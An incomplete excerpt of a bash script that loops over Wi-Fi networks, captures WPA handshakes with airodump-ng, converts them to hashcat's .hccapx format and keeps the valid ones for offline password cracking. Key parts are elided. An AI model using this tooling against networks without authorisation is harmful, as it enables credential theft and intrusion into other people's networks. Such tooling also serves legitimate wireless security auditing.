...
f_config="/handshakes2/2.conf"
f_db="/handshakes2/db"
d_handshakes="/handshakes2/handshakes"
...
hc_run(){
	...
	do
		...
		do
            ...
            # Capture handshake
            timeout --foreground 10s airodump-ng -w /tmp/hc_captures/"$essid" --output-format pcap --bssid "$bssid" --channel "$channel" "$interface" &> /dev/null
            ...
            # Convert to .hccapx
            cap2hccapx "/tmp/hc_captures/$essid.pcap" "/tmp/hc_handshakes/$essid.hccapx" &> /dev/null
            ...
            mv "/tmp/hc_captures/$essid-01.cap" "$d_handshakes/$unique_cap" &> /dev/null

            # Check if handshake is valid
            hashflag=$(wlanhcxinfo -i "/tmp/hc_handshakes/$essid.hccapx" 2>&1)
            if [[ $hashflag == *"0 records loaded"* ]]; then
                # Remove invalid .hccapx and move .pcap to destination
                rm "/tmp/hc_handshakes/$essid.hccapx" "$d_handshakes/$essid.hccapx" &> /dev/null
                mv "/tmp/hc_captures/$essid-01.pcap" "$d_handshakes/$essid-01.pcap" &> /dev/null
            else
                # Move valid .hccapx to destination with unique name
                mv "/tmp/hc_handshakes/$essid.hccapx" "$d_handshakes/$unique_hccapx" &> /dev/null
                ((hs_count++))
